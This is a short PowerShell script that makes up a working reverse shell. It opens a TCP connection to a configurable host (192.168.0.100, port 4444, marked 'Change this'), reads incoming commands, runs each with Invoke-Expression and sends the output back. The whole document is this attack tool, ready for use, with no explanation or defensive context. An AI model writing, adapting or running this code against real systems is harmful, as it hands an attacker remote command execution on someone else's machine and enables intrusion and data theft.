$srvAddr = "192.168.0.100" #Change this!!!!!!!!!!
$srvPort = 4444 #Change this!!!!!!!!!!
$bufSz   = 1024

$cli = New-Object System.Net.Sockets.TcpClient($srvAddr, $srvPort)
$nst = $cli.GetStream()
$rdr = New-Object System.IO.StreamReader($nst)
$wtr = New-Object System.IO.StreamWriter($nst)
$wtr.AutoFlush = $true
$buf = New-Object System.Byte[] $bufSz

while ($cli.Connected) {
    while ($nst.DataAvailable) {
        $raw = $nst.Read($buf, 0, $buf.Length)
        if ($raw -gt 0) {
            $cmd = ([System.Text.Encoding]::UTF8).GetString($buf, 0, $raw).Trim()
        }
    }
    if ($cli.Connected -and $cmd.Length -gt 1) {
        $pwd = (Get-Location).Path
        $wtr.Write("PS $pwd> $cmd`n")
        $out = try { Invoke-Expression ($cmd) 2>&1 } catch { $_ }
        $wtr.Write("$out`n")
        $cmd = $null
    }
}

$cli.Close()
$nst.Close()
$rdr.Close()
$wtr.Close()